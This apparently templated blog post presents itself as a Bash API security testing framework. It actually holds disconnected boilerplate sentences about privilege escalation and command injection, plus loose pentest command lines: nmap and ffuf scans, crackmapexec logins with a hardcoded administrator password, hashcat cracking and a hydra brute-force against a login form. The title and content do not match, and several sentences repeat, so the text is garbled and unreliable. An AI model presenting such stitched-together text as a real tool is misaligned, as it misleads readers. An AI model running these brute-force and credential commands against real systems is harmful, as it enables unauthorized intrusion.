---
TitleSEO: "API Security Testing Framework in Bash | ZureFX"
TitlePost: "API Security Testing Framework — Bash"
Author: "ZureFX"
Description: "A Bash script for api security testing framework. Built for security research and automation."
Keywords: "go, scanner, fuzzer, rust, bash"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-894.html"
URL_IMAGES: ""
Date: "2024-07-17"
Tags: "Go, Scanner, Fuzzer, Rust, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-894"
Permalink: "/scripting/script-api-security-testing-framework-894.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `smbexec`
- `msfvenom`
- `hydra`

## Implementation

### Core Logic

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.70.209.20/FUZZ
nmap -sCV -p22,143,8888 10.40.149.73 -oN scan.txt
crackmapexec smb 10.43.138.189 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

The application stored sensitive credentials in an unencrypted configuration file. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
crackmapexec smb 10.73.93.195 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.20.75.81/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.149.19 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p3306,995,23 10.26.60.7 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p993,587,5986 10.38.10.182 -oN scan.txt
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 5.44s
```
